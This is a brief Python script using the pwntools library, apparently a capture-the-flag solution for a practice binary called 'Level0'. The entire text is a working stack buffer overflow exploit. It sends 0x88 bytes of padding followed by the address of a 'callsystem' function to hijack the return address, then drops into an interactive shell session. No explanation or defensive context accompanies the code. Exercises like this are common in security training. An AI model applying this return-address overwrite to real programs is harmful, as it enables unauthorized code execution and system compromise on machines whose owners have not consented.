from pwn import *
p=process("./Level0")
callsystem=0x400596 
payload=b'a'*0x88 + p64(callsystem)
p.recvuntil("Hello, World\n")
p.sendline(payload)
p.interactive()